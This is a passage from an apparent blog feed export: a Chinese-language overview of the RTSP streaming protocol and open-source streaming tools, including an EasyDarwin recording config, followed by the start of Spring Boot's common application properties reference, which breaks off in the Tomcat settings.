<h2 id="二、RTSP"><a href="#二、RTSP" class="headerlink" title="二、RTSP"></a>二、RTSP</h2><p>Real Time Streaming Protocol（实时流媒体协议）在网络环境比较稳定的情况下，传输效率是比较高，虽然实时性比较好，用在互联网上可能会丢包。网络摄像头常采用RTSP协议，比如海康的摄像头。<br>RTSP只是一个实时流媒体协议（应用层文本协议，类HTTP），RTSP只负责会话,如建立连接、播放暂停控制等。而RTP协议（实时传输协议）负载传输音视频数据，RTP又分为 <code>rtp over tcp</code> 和 <code>rtp over udp</code>，<a href="https://blog.csdn.net/smilestone_322/article/details/17892967" target="_blank" rel="noopener">【RFC3984中文版】</a>、<a href="https://juejin.im/post/5a6877946fb9a01cb74e8c9f" target="_blank" rel="noopener">【RTP/RTCP协议与RTSP协议】</a>。</p>
<p>一般的cs架构如下：</p>
<ul>
<li>直播： <code>采集端rtps-client</code>-&gt; <code>web服务器rtsp-server</code> -&gt; <code>播放端rtsp-client</code></li>
<li>点播： <code>web服务器rtsp-server</code> -&gt; <code>播放端rtsp-client</code></li>
<li>监控： <code>采集端rtsp-server</code> -&gt; <code>播放端rtsp-client</code></li>
</ul>
<h4 id="RTSP特性"><a href="#RTSP特性" class="headerlink" title="RTSP特性"></a>RTSP特性</h4><blockquote>
<p>通常说的RTSP包括RTSP协议、RTP协议、RTCP协议</p>
<ul>
<li>RTSP协议：负责服务器与客户端之间的请求与响应</li>
<li>RTP协议：负责传输媒体数据</li>
<li>RTCP协议：在RTP传输过程中提供传输信息<br>来自<a href="https://blog.csdn.net/weixin_42462202/article/details/98986535" target="_blank" rel="noopener">RTSP协议讲解</a></li>
</ul>
</blockquote>
<p>特点：</p>
<ol>
<li>实时性比较好</li>
<li>传输效率是比较高</li>
<li>底层采用RTP传输，RTP大多数采用UDP（也可以TCP），网络复杂环境下容易丢包</li>
<li>浏览器不支持</li>
</ol>
<p>应用场景</p>
<ol>
<li>网络摄像头、安防监控（如海康摄像头）</li>
<li>IPTV</li>
</ol>
<h2 id="三、开源软件"><a href="#三、开源软件" class="headerlink" title="三、开源软件"></a>三、开源软件</h2><h4 id="Ⅰ、推流端"><a href="#Ⅰ、推流端" class="headerlink" title="Ⅰ、推流端"></a>Ⅰ、推流端</h4><ol>
<li><a href="https://github.com/pedroSG94/rtmp-rtsp-stream-client-java" target="_blank" rel="noopener">【rtmp-rtsp-stream-client-java】</a><br> 纯Java编写的RTSP和RTMP推流Client（推荐学习其源码），直接封装Android的Camera层，非常容易使用，支持Camera1和Camera2 API。</li>
<li><a href="https://github.com/begeekmyfriend/yasea" target="_blank" rel="noopener">【yasea】</a>  Android RTMP 推流 Client，它将摄像头YUV和麦克风PCM数据编码到H.264/AAC中，封装在FLV中。 依赖C库：libx264、libyuv、libenc</li>
<li><a href="https://github.com/bytedeco/javacv" target="_blank" rel="noopener">【JavaCV推流】</a><br> JavaCV这个项目底层调用的ffmpeg，所以RTMP和RTSP都支持。</li>
<li>OBS<br> PC桌面RTMP推流开源软件，现在网红主播用的主流软件(跨平台)。    </li>
</ol>
<h4 id="Ⅱ、服务端"><a href="#Ⅱ、服务端" class="headerlink" title="Ⅱ、服务端"></a>Ⅱ、服务端</h4><ol>
<li><a href="https://github.com/arut/nginx-rtmp-module" target="_blank" rel="noopener">【nginx-rtmp-module】</a><br> 国人写的项目，仅支持rtmp，目前(20200708) start 9.7K ，它nginx的一个插件，需要自己编译一次nginx。</li>
<li><a href="https://github.com/ossrs/srs" target="_blank" rel="noopener">【srs】 </a><br> 国人写的这是C++项目，目前(20200708) start 8.9K ，<a href="https://github.com/ossrs/srs/wiki/v1_CN_Product#release30" target="_blank" rel="noopener">项目介绍</a> ，支持RTMP/HLS/WebRTC/SRT/GB28181。<a href="https://github.com/ossrs/srs/pull/133" target="_blank" rel="noopener">新版本貌似RTSP也支持了？</a></li>
<li><a href="https://github.com/EasyDarwin/EasyDarwin" target="_blank" rel="noopener">EasyDarwin</a><br> 国内公司写的Go项目，目前(20200708) start 4.1K ，高性能开源RTSP流媒体服务器，RTSP推模式转发、RTSP拉模式转发、录像、检索、回放、关键帧缓存、秒开画面、RESTful接口、WEB后台管理、分布式负载均衡。</li>
<li><a href="https://github.com/sszhangpengfei/AndroidShow" target="_blank" rel="noopener">【AndroidShow】</a><br> 国人写的Android App项目，通过MediaProjectionManager采集Android屏幕视频流，手机采集端做<code>rtsp server</code>，通过<code>rtp over udp</code> 传输视频流，但还没有实现音频，具体看作者的博客：<a href="https://blog.csdn.net/ss182172633/article/details/79578372" target="_blank" rel="noopener">【Android录屏直播】</a><blockquote>
<p>注：传输用的【spydroid-ipcamera】代码</p>
</blockquote>
</li>
<li><a href="https://github.com/fyhertz/spydroid-ipcamera" target="_blank" rel="noopener">【spydroid-ipcamera】</a><br> 这是法国人写的Android App项目，很久远的项目了，第一次提交是2013年，它可以将您手机变成网络摄像头(提供RTSP Server)，项目不再维护，但是作者将这个项目独立为一个Java库:【libstreaming】。<blockquote>
<p>注: <a href="https://www.jianshu.com/p/519c4a908000" target="_blank" rel="noopener">【spydroid-ipcamera源码分析】</a></p>
</blockquote>
</li>
<li><a href="https://github.com/fyhertz/libstreaming" target="_blank" rel="noopener">【libstreaming】</a><br> 从【spydroid-ipcamera】独立出来的 Android Java库，目前(20200708) start 2.9K 。<blockquote>
<p>注： <a href="https://github.com/fyhertz/libstreaming-examples" target="_blank" rel="noopener">【示例代码：libstreaming-examples】</a></p>
</blockquote>
</li>
<li>live555<br> c++编写的项目，RTSP点播服务器，不支持推/拉流转发。<a href="../Live555搭建流媒体服务器">【Live555 搭建流媒体服务器】</a></li>
<li><a href="https://github.com/mutaphore/RTSP-Client-Server" target="_blank" rel="noopener">【RTSP-Client-Server】</a><br> 国外的Java Swing项目，目前(20200708) start 376 ，源码很少和简单（项目没有用IDE创建，用命令行编译），可读性强，运行效果是client点播server的Mjpeg文件，不依赖第三方。</li>
<li><a href="https://github.com/zhouyinfei/rtsp-netty-server" target="_blank" rel="noopener">【rtsp-netty-server 】</a><br> 国人写的Java项目（Elicpse），目前(20200708) start 1 。 RTP数据部分依赖<a href="https://github.com/jitsi/libjitsi" target="_blank" rel="noopener">【libjitsi】</a>的RawPacket类。<blockquote>
<p>注：【libjitsi】 实时音频/视频通信的高级Java媒体库，没有在mvnrepository发布，编译很麻烦，jitsi是做视频会议全套软件的。</p>
</blockquote>
</li>
<li><a href="https://github.com/langhuihui/monibuca" target="_blank" rel="noopener">【monibuca】</a>国内公司写的Go项目，目前(20200721) start 209 ，Monibuca 引擎 + 插件 = 定制化流媒体服务器。<a href="http://monibuca.com/" target="_blank" rel="noopener">官网</a>，这是一个新的项目，看commit记录，是2020年提交的项目。</li>
</ol>
<h4 id="Ⅲ、播放端和拉流"><a href="#Ⅲ、播放端和拉流" class="headerlink" title="Ⅲ、播放端和拉流"></a>Ⅲ、播放端和拉流</h4><ol>
<li>VLC</li>
<li>ffplay</li>
<li>ijkplayer</li>
<li>JavaCV库拉流(底层调用的ffmpeg)</li>
<li><a href="https://github.com/phyhw/rtsplib-java" target="_blank" rel="noopener">【code.google.com/p/rtsplib-java】</a>这是一个纯Java实现的 RTSPClient 远古时代的库(Eclipse)，只实现了RTSP部分的协议（PLAY等方法），可以基于它实现扩展其他方法。</li>
<li><a href="https://github.com/srysduedu123/rtsp-h264-client/" target="_blank" rel="noopener">【srysduedu123/rtsp-h264-client】</a> 基于 <code>rtsplib-java</code> ，加了解析RTP和H264 。</li>
<li><a href="https://github.com/htwahzs/Rtsp-Android-Client" target="_blank" rel="noopener">【htwahzs/Rtsp-Android-Client】</a> 不依赖其他库，纯java实现RTSP、RTP、RTCP和硬解码渲染，经测试能正常播放，出图速度比ijkpaler快 。但本身这个仓库只有纯Java类(完整)，不是一个完整的Android项目，我fork了此项目，做成一个Demo<a href="https://github.com/kevinvane/Rtsp-Android-Client" target="_blank" rel="noopener">【kevinvane/Rtsp-Android-Client】</a>。</li>
</ol>
<h2 id="四、利用开源软件搭建一套直播测试平台"><a href="#四、利用开源软件搭建一套直播测试平台" class="headerlink" title="四、利用开源软件搭建一套直播测试平台"></a>四、利用开源软件搭建一套直播测试平台</h2><ul>
<li>rtsp-client推流： ffmpeg 推流 或者 rtmp-rtsp-stream-client-java (Android,集成到自己项目中推荐使用) </li>
<li>rtsp-server：ffmpeg的ffserver 或者 EasyDarwin （EasyDarwin rtsp端口554，web管理后台端口10008）</li>
<li>rtsp-play： ffmpeg的ffplay 、VCL或者 ijkplayer(移动端，集成到自己项目中推荐使用)</li>
</ul>
<blockquote>
<p>注：EasyDarwin有提供各个平台的软件，除了服务端好用，其他觉得有点难用，不推荐。</p>
</blockquote>
<h2 id="五、流视频录制并存储方案"><a href="#五、流视频录制并存储方案" class="headerlink" title="五、流视频录制并存储方案"></a>五、流视频录制并存储方案</h2><ol>
<li><p>JavaCV从流服务器拉取音视频录制<br>底层是调用的是ffmpeg拉流存储</p>
</li>
<li><p>EasyDarwin的方案<br>EasyDarwin自带录制功能，对外提供 RESTFUL API 详细文章 -&gt; <a href="https://blog.csdn.net/jyt0551/article/details/84189498" target="_blank" rel="noopener">【EasyDarwinGo录像功能发布】</a><br>底层也是调用的是ffmpeg拉流存储的方案，这是它默认配置文件：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[rtsp]</span></span><br><span class="line"><span class="attr">port</span>=<span class="number">554</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; rtsp 超时时间，包括RTSP建立连接与数据收发。</span></span><br><span class="line"><span class="attr">timeout</span>=<span class="number">28800</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 是否使能gop cache。如果使能，服务器会缓存最后一个I帧以及其后的非I帧，以提高播放速度。但是可能在高并发的情况下带来内存压力。</span></span><br><span class="line"><span class="attr">gop_cache_enable</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 是否使能向服务器推流或者从服务器播放时验证用户名密码. [注意] 因为服务器端并不保存明文密码，所以推送或者播放时，客户端应该输入密码的md5后的值。</span></span><br><span class="line"><span class="comment">; password should be the hex of md5(original password)</span></span><br><span class="line"><span class="attr">authorization_enable</span>=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 是否使能推送的同事进行本地存储，使能后则可以进行录像查询与回放。</span></span><br><span class="line"><span class="attr">save_stream_to_local</span>=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;easydarwin使用ffmpeg工具来进行存储。这里表示ffmpeg的可执行程序的路径</span></span><br><span class="line"><span class="attr">ffmpeg_path</span>=/Users/ze/Downloads/ffmpeg-<span class="number">20180719</span>-<span class="number">9</span>cb3d8f-macos64-shared/bin/ffmpeg</span><br><span class="line"></span><br><span class="line"><span class="comment">;本地存储所将要保存的根目录。如果不存在，程序会尝试创建该目录。</span></span><br><span class="line"><span class="attr">m3u8_dir_path</span>=/Users/ze/Downloads/EasyDarwinGoM3u8</span><br><span class="line"></span><br><span class="line"><span class="comment">;切片文件时长。本地存储时，将以该时间段为标准来生成ts文件(该时间+一个I帧间隔)，单位秒。</span></span><br><span class="line"><span class="comment">;如果需要直播，这个值设小点，但是这样会产生很多ts文件；如果不需要直播，只要存储的话，可设大些。</span></span><br><span class="line"><span class="attr">ts_duration_second</span>=<span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;key为拉流时的自定义路径，value为ffmpeg转码格式，比如可设置为-c:v copy -c:a copy，表示copy源格式；default表示使用ffmpeg内置的输出格式，会进行转码。</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <categories>
        <category>音视频</category>
      </categories>
  </entry>
  <entry>
    <title>SpringBoot全局属性</title>
    <url>/SpringBoot/SpringBoot%E5%85%A8%E5%B1%80%E5%B1%9E%E6%80%A7/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ===================================================================</span><br><span class="line"># COMMON SPRING BOOT PROPERTIES</span><br><span class="line">#</span><br><span class="line"># This sample file is provided as a guideline. Do NOT copy it in its</span><br><span class="line"># entirety to your own application.			   ^^^</span><br><span class="line"># ===================================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ----------------------------------------</span><br><span class="line"># CORE PROPERTIES</span><br><span class="line"># ----------------------------------------</span><br><span class="line">debug=false # Enable debug logs.</span><br><span class="line">trace=false # Enable trace logs.</span><br><span class="line"></span><br><span class="line"># LOGGING</span><br><span class="line">logging.config= # Location of the logging configuration file. For instance, `classpath:logback.xml` for Logback.</span><br><span class="line">logging.exception-conversion-word=%wEx # Conversion word used when logging exceptions.</span><br><span class="line">logging.file= # Log file name (for instance, `myapp.log`). Names can be an exact location or relative to the current directory.</span><br><span class="line">logging.file.max-history=0 # Maximum of archive log files to keep. Only supported with the default logback setup.</span><br><span class="line">logging.file.max-size=10MB # Maximum log file size. Only supported with the default logback setup.</span><br><span class="line">logging.level.*= # Log levels severity mapping. For instance, `logging.level.org.springframework=DEBUG`.</span><br><span class="line">logging.path= # Location of the log file. For instance, `/var/log`.</span><br><span class="line">logging.pattern.console= # Appender pattern for output to the console. Supported only with the default Logback setup.</span><br><span class="line">logging.pattern.dateformat=yyyy-MM-dd HH:mm:ss.SSS # Appender pattern for log date format. Supported only with the default Logback setup.</span><br><span class="line">logging.pattern.file= # Appender pattern for output to a file. Supported only with the default Logback setup.</span><br><span class="line">logging.pattern.level=%5p # Appender pattern for log level. Supported only with the default Logback setup.</span><br><span class="line">logging.register-shutdown-hook=false # Register a shutdown hook for the logging system when it is initialized.</span><br><span class="line"></span><br><span class="line"># AOP</span><br><span class="line">spring.aop.auto=true # Add @EnableAspectJAutoProxy.</span><br><span class="line">spring.aop.proxy-target-class=true # Whether subclass-based (CGLIB) proxies are to be created (true), as opposed to standard Java interface-based proxies (false).</span><br><span class="line"></span><br><span class="line"># IDENTITY (ContextIdApplicationContextInitializer)</span><br><span class="line">spring.application.name= # Application name.</span><br><span class="line"></span><br><span class="line"># ADMIN (SpringApplicationAdminJmxAutoConfiguration)</span><br><span class="line">spring.application.admin.enabled=false # Whether to enable admin features for the application.</span><br><span class="line">spring.application.admin.jmx-name=org.springframework.boot:type=Admin,name=SpringApplication # JMX name of the application admin MBean.</span><br><span class="line"></span><br><span class="line"># AUTO-CONFIGURATION</span><br><span class="line">spring.autoconfigure.exclude= # Auto-configuration classes to exclude.</span><br><span class="line"></span><br><span class="line"># BANNER</span><br><span class="line">spring.banner.charset=UTF-8 # Banner file encoding.</span><br><span class="line">spring.banner.location=classpath:banner.txt # Banner text resource location.</span><br><span class="line">spring.banner.image.location=classpath:banner.gif # Banner image file location (jpg or png can also be used).</span><br><span class="line">spring.banner.image.width=76 # Width of the banner image in chars.</span><br><span class="line">spring.banner.image.height= # Height of the banner image in chars (default based on image height).</span><br><span class="line">spring.banner.image.margin=2 # Left hand image margin in chars.</span><br><span class="line">spring.banner.image.invert=false # Whether images should be inverted for dark terminal themes.</span><br><span class="line"></span><br><span class="line"># SPRING CORE</span><br><span class="line">spring.beaninfo.ignore=true # Whether to skip search of BeanInfo classes.</span><br><span class="line"></span><br><span class="line"># SPRING CACHE (CacheProperties)</span><br><span class="line">spring.cache.cache-names= # Comma-separated list of cache names to create if supported by the underlying cache manager.</span><br><span class="line">spring.cache.caffeine.spec= # The spec to use to create caches. See CaffeineSpec for more details on the spec format.</span><br><span class="line">spring.cache.couchbase.expiration=0ms # Entry expiration. By default the entries never expire. Note that this value is ultimately converted to seconds.</span><br><span class="line">spring.cache.ehcache.config= # The location of the configuration file to use to initialize EhCache.</span><br><span class="line">spring.cache.infinispan.config= # The location of the configuration file to use to initialize Infinispan.</span><br><span class="line">spring.cache.jcache.config= # The location of the configuration file to use to initialize the cache manager.</span><br><span class="line">spring.cache.jcache.provider= # Fully qualified name of the CachingProvider implementation to use to retrieve the JSR-107 compliant cache manager. Needed only if more than one JSR-107 implementation is available on the classpath.</span><br><span class="line">spring.cache.redis.cache-null-values=true # Allow caching null values.</span><br><span class="line">spring.cache.redis.key-prefix= # Key prefix.</span><br><span class="line">spring.cache.redis.time-to-live=0ms # Entry expiration. By default the entries never expire.</span><br><span class="line">spring.cache.redis.use-key-prefix=true # Whether to use the key prefix when writing to Redis.</span><br><span class="line">spring.cache.type= # Cache type. By default, auto-detected according to the environment.</span><br><span class="line"></span><br><span class="line"># SPRING CONFIG - using environment property only (ConfigFileApplicationListener)</span><br><span class="line">spring.config.additional-location= # Config file locations used in addition to the defaults.</span><br><span class="line">spring.config.location= # Config file locations that replace the defaults.</span><br><span class="line">spring.config.name=application # Config file name.</span><br><span class="line"></span><br><span class="line"># HAZELCAST (HazelcastProperties)</span><br><span class="line">spring.hazelcast.config= # The location of the configuration file to use to initialize Hazelcast.</span><br><span class="line"></span><br><span class="line"># PROJECT INFORMATION (ProjectInfoProperties)</span><br><span class="line">spring.info.build.location=classpath:META-INF/build-info.properties # Location of the generated build-info.properties file.</span><br><span class="line">spring.info.git.location=classpath:git.properties # Location of the generated git.properties file.</span><br><span class="line"></span><br><span class="line"># JMX</span><br><span class="line">spring.jmx.default-domain= # JMX domain name.</span><br><span class="line">spring.jmx.enabled=true # Expose management beans to the JMX domain.</span><br><span class="line">spring.jmx.server=mbeanServer # MBeanServer bean name.</span><br><span class="line"></span><br><span class="line"># Email (MailProperties)</span><br><span class="line">spring.mail.default-encoding=UTF-8 # Default MimeMessage encoding.</span><br><span class="line">spring.mail.host= # SMTP server host. For instance, `smtp.example.com`.</span><br><span class="line">spring.mail.jndi-name= # Session JNDI name. When set, takes precedence over other mail settings.</span><br><span class="line">spring.mail.password= # Login password of the SMTP server.</span><br><span class="line">spring.mail.port= # SMTP server port.</span><br><span class="line">spring.mail.properties.*= # Additional JavaMail session properties.</span><br><span class="line">spring.mail.protocol=smtp # Protocol used by the SMTP server.</span><br><span class="line">spring.mail.test-connection=false # Whether to test that the mail server is available on startup.</span><br><span class="line">spring.mail.username= # Login user of the SMTP server.</span><br><span class="line"></span><br><span class="line"># APPLICATION SETTINGS (SpringApplication)</span><br><span class="line">spring.main.banner-mode=console # Mode used to display the banner when the application runs.</span><br><span class="line">spring.main.sources= # Sources (class names, package names, or XML resource locations) to include in the ApplicationContext.</span><br><span class="line">spring.main.web-application-type= # Flag to explicitly request a specific type of web application. If not set, auto-detected based on the classpath.</span><br><span class="line"></span><br><span class="line"># FILE ENCODING (FileEncodingApplicationListener)</span><br><span class="line">spring.mandatory-file-encoding= # Expected character encoding the application must use.</span><br><span class="line"></span><br><span class="line"># INTERNATIONALIZATION (MessageSourceProperties)</span><br><span class="line">spring.messages.always-use-message-format=false # Whether to always apply the MessageFormat rules, parsing even messages without arguments.</span><br><span class="line">spring.messages.basename=messages # Comma-separated list of basenames (essentially a fully-qualified classpath location), each following the ResourceBundle convention with relaxed support for slash based locations.</span><br><span class="line">spring.messages.cache-duration= # Loaded resource bundle files cache duration. When not set, bundles are cached forever. If a duration suffix is not specified, seconds will be used.</span><br><span class="line">spring.messages.encoding=UTF-8 # Message bundles encoding.</span><br><span class="line">spring.messages.fallback-to-system-locale=true # Whether to fall back to the system Locale if no files for a specific Locale have been found.</span><br><span class="line">spring.messages.use-code-as-default-message=false # Whether to use the message code as the default message instead of throwing a &quot;NoSuchMessageException&quot;. Recommended during development only.</span><br><span class="line"></span><br><span class="line"># OUTPUT</span><br><span class="line">spring.output.ansi.enabled=detect # Configures the ANSI output.</span><br><span class="line"></span><br><span class="line"># PID FILE (ApplicationPidFileWriter)</span><br><span class="line">spring.pid.fail-on-write-error= # Fails if ApplicationPidFileWriter is used but it cannot write the PID file.</span><br><span class="line">spring.pid.file= # Location of the PID file to write (if ApplicationPidFileWriter is used).</span><br><span class="line"></span><br><span class="line"># PROFILES</span><br><span class="line">spring.profiles.active= # Comma-separated list of active profiles. Can be overridden by a command line switch.</span><br><span class="line">spring.profiles.include= # Unconditionally activate the specified comma-separated list of profiles (or list of profiles if using YAML).</span><br><span class="line"></span><br><span class="line"># QUARTZ SCHEDULER (QuartzProperties)</span><br><span class="line">spring.quartz.jdbc.initialize-schema=embedded # Database schema initialization mode.</span><br><span class="line">spring.quartz.jdbc.schema=classpath:org/quartz/impl/jdbcjobstore/tables_@@platform@@.sql # Path to the SQL file to use to initialize the database schema.</span><br><span class="line">spring.quartz.job-store-type=memory # Quartz job store type.</span><br><span class="line">spring.quartz.properties.*= # Additional Quartz Scheduler properties.</span><br><span class="line"></span><br><span class="line"># REACTOR (ReactorCoreProperties)</span><br><span class="line">spring.reactor.stacktrace-mode.enabled=false # Whether Reactor should collect stacktrace information at runtime.</span><br><span class="line"></span><br><span class="line"># SENDGRID (SendGridAutoConfiguration)</span><br><span class="line">spring.sendgrid.api-key= # SendGrid API key.</span><br><span class="line">spring.sendgrid.proxy.host= # SendGrid proxy host.</span><br><span class="line">spring.sendgrid.proxy.port= # SendGrid proxy port.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ----------------------------------------</span><br><span class="line"># WEB PROPERTIES</span><br><span class="line"># ----------------------------------------</span><br><span class="line"></span><br><span class="line"># EMBEDDED SERVER CONFIGURATION (ServerProperties)</span><br><span class="line">server.address= # Network address to which the server should bind.</span><br><span class="line">server.compression.enabled=false # Whether response compression is enabled.</span><br><span class="line">server.compression.excluded-user-agents= # List of user-agents to exclude from compression.</span><br><span class="line">server.compression.mime-types=text/html,text/xml,text/plain,text/css,text/javascript,application/javascript # Comma-separated list of MIME types that should be compressed.</span><br><span class="line">server.compression.min-response-size=2048 # Minimum &quot;Content-Length&quot; value that is required for compression to be performed.</span><br><span class="line">server.connection-timeout= # Time that connectors wait for another HTTP request before closing the connection. When not set, the connector&apos;s container-specific default is used. Use a value of -1 to indicate no (that is, an infinite) timeout.</span><br><span class="line">server.error.include-exception=false # Include the &quot;exception&quot; attribute.</span><br><span class="line">server.error.include-stacktrace=never # When to include a &quot;stacktrace&quot; attribute.</span><br><span class="line">server.error.path=/error # Path of the error controller.</span><br><span class="line">server.error.whitelabel.enabled=true # Whether to enable the default error page displayed in browsers in case of a server error.</span><br><span class="line">server.http2.enabled=false # Whether to enable HTTP/2 support, if the current environment supports it.</span><br><span class="line">server.jetty.acceptors= # Number of acceptor threads to use.</span><br><span class="line">server.jetty.accesslog.append=false # Append to log.</span><br><span class="line">server.jetty.accesslog.date-format=dd/MMM/yyyy:HH:mm:ss Z # Timestamp format of the request log.</span><br><span class="line">server.jetty.accesslog.enabled=false # Enable access log.</span><br><span class="line">server.jetty.accesslog.extended-format=false # Enable extended NCSA format.</span><br><span class="line">server.jetty.accesslog.file-date-format= # Date format to place in log file name.</span><br><span class="line">server.jetty.accesslog.filename= # Log filename. If not specified, logs redirect to &quot;System.err&quot;.</span><br><span class="line">server.jetty.accesslog.locale= # Locale of the request log.</span><br><span class="line">server.jetty.accesslog.log-cookies=false # Enable logging of the request cookies.</span><br><span class="line">server.jetty.accesslog.log-latency=false # Enable logging of request processing time.</span><br><span class="line">server.jetty.accesslog.log-server=false # Enable logging of the request hostname.</span><br><span class="line">server.jetty.accesslog.retention-period=31 # Number of days before rotated log files are deleted.</span><br><span class="line">server.jetty.accesslog.time-zone=GMT # Timezone of the request log.</span><br><span class="line">server.jetty.max-http-post-size=0 # Maximum size, in bytes, of the HTTP post or put content.</span><br><span class="line">server.jetty.selectors= # Number of selector threads to use.</span><br><span class="line">server.max-http-header-size=0 # Maximum size, in bytes, of the HTTP message header.</span><br><span class="line">server.port=8080 # Server HTTP port.</span><br><span class="line">server.server-header= # Value to use for the Server response header (if empty, no header is sent).</span><br><span class="line">server.use-forward-headers= # Whether X-Forwarded-* headers should be applied to the HttpRequest.</span><br><span class="line">server.servlet.context-parameters.*= # Servlet context init parameters.</span><br><span class="line">server.servlet.context-path= # Context path of the application.</span><br><span class="line">server.servlet.application-display-name=application # Display name of the application.</span><br><span class="line">server.servlet.jsp.class-name=org.apache.jasper.servlet.JspServlet # The class name of the JSP servlet.</span><br><span class="line">server.servlet.jsp.init-parameters.*= # Init parameters used to configure the JSP servlet.</span><br><span class="line">server.servlet.jsp.registered=true # Whether the JSP servlet is registered.</span><br><span class="line">server.servlet.path=/ # Path of the main dispatcher servlet.</span><br><span class="line">server.servlet.session.cookie.comment= # Comment for the session cookie.</span><br><span class="line">server.servlet.session.cookie.domain= # Domain for the session cookie.</span><br><span class="line">server.servlet.session.cookie.http-only= # &quot;HttpOnly&quot; flag for the session cookie.</span><br><span class="line">server.servlet.session.cookie.max-age= # Maximum age of the session cookie. If a duration suffix is not specified, seconds will be used.</span><br><span class="line">server.servlet.session.cookie.name= # Session cookie name.</span><br><span class="line">server.servlet.session.cookie.path= # Path of the session cookie.</span><br><span class="line">server.servlet.session.cookie.secure= # &quot;Secure&quot; flag for the session cookie.</span><br><span class="line">server.servlet.session.persistent=false # Whether to persist session data between restarts.</span><br><span class="line">server.servlet.session.store-dir= # Directory used to store session data.</span><br><span class="line">server.servlet.session.timeout= # Session timeout. If a duration suffix is not specified, seconds will be used.</span><br><span class="line">server.servlet.session.tracking-modes= # Session tracking modes (one or more of the following: &quot;cookie&quot;, &quot;url&quot;, &quot;ssl&quot;).</span><br><span class="line">server.ssl.ciphers= # Supported SSL ciphers.</span><br><span class="line">server.ssl.client-auth= # Whether client authentication is wanted (&quot;want&quot;) or needed (&quot;need&quot;). Requires a trust store.</span><br><span class="line">server.ssl.enabled= # Enable SSL support.</span><br><span class="line">server.ssl.enabled-protocols= # Enabled SSL protocols.</span><br><span class="line">server.ssl.key-alias= # Alias that identifies the key in the key store.</span><br><span class="line">server.ssl.key-password= # Password used to access the key in the key store.</span><br><span class="line">server.ssl.key-store= # Path to the key store that holds the SSL certificate (typically a jks file).</span><br><span class="line">server.ssl.key-store-password= # Password used to access the key store.</span><br><span class="line">server.ssl.key-store-provider= # Provider for the key store.</span><br><span class="line">server.ssl.key-store-type= # Type of the key store.</span><br><span class="line">server.ssl.protocol=TLS # SSL protocol to use.</span><br><span class="line">server.ssl.trust-store= # Trust store that holds SSL certificates.</span><br><span class="line">server.ssl.trust-store-password= # Password used to access the trust store.</span><br><span class="line">server.ssl.trust-store-provider= # Provider for the trust store.</span><br><span class="line">server.ssl.trust-store-type= # Type of the trust store.</span><br><span class="line">server.tomcat.accept-count=0 # Maximum queue length for incoming connection requests when all possible request processing threads are in use.</span><br><span class="line">server.tomcat.accesslog.buffered=true # Whether to buffer output such that it is flushed only periodically.</span><br><span class="line">server.tomcat.accesslog.directory=logs # Directory in which log files are created. Can be absolute or relative to the Tomcat base dir.</span><br><span class="line">server.tomcat.accesslog.enabled=false # Enable access log.</span><br><span class="line">server.tomcat.accesslog.file-date-format=.yyyy-MM-dd # Date format to place in the log file name.</span><br><span class="line">server.tomcat.accesslog.pattern=common # Format pattern for access logs.</span><br><span class="line">server.tomcat.accesslog.prefix=access_log # Log file name prefix.</span><br><span class="line">server.tomcat.accesslog.rename-on-rotate=false # Whether to defer inclusion of the date stamp in the file name until rotate time.</span><br><span class="line">server.tomcat.accesslog.request-attributes-enabled=false # Set request attributes for the IP address, Hostname, protocol, and port used for the request.</span><br><span class="line">server.tomcat.accesslog.rotate=true # Whether to enable access log rotation.</span><br><span class="line">server.tomcat.accesslog.suffix=.log # Log file name suffix.</span><br><span class="line">server.tomcat.additional-tld-skip-patterns= # Comma-separated list of additional patterns that match jars to ignore for TLD scanning.</span><br><span class="line">server.tomcat.background-processor-delay=30s # Delay between the invocation of backgroundProcess methods. If a duration suffix is not specified, seconds will be used.</span><br><span class="line">server.tomcat.basedir= # Tomcat base directory. If not specified, a temporary directory is used.</span><br><span class="line">server.tomcat.internal-proxies=10\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;|\\</span><br><span class="line">		192\\.168\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;|\\</span><br><span class="line">		169\\.254\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;|\\</span><br><span class="line">		127\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;|\\</span><br><span class="line">		172\\.1[6-9]&#123;1&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;|\\</span><br><span class="line">		172\\.2[0-9]&#123;1&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;|\\</span><br><span class="line">		172\\.3[0-1]&#123;1&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125; # Regular expression matching trusted IP addresses.</span><br><span class="line">server.tomcat.max-connections=0 # Maximum number of connections that the server accepts and processes at any given time.</span><br><span class="line">server.tomcat.max-http-header-size=0 # Maximum size, in bytes, of the HTTP message header.</span><br><span class="line">server.tomcat.max-http-post-size=0 # Maximum size, in bytes, of the HTTP post content.</span><br><span class="line">server.tomcat.max-threads=0 # Maximum number of worker threads.</span><br><span class="line">server.tomcat.min-spare-threads=0 # Minimum number of worker threads.</span><br><span class="line">server.tomcat.port-header=X-Forwarded-Port # Name of the HTTP header used to override the original port value.</span><br><span class="line">server.tomcat.protocol-header= # Header that holds the incoming protocol, usually named &quot;X-Forwarded-Proto&quot;.</span><br><span class="line">server.tomcat.protocol-header-https-value=https # Value of the protocol header indicating whether the incoming request uses SSL.</span><br><span class="line">server.tomcat.redirect-context-root= # Whether requests to the context root should be redirected by appending a / to the path.</span><br><span class="line">server.tomcat.remote-ip-header= # Name of the HTTP header from which the remote IP is extracted. For instance, `X-FORWARDED-FOR`.</span><br><span class="line">server.tomcat.resource.cache-ttl= # Time-to-live of the static resource cache.</span><br><span class="line">server.tomcat.uri-encoding=UTF-8 # Character encoding to use to decode the URI.</span><br><span class="line">server.tomcat.use-relative-redirects= # Whether HTTP 1.1 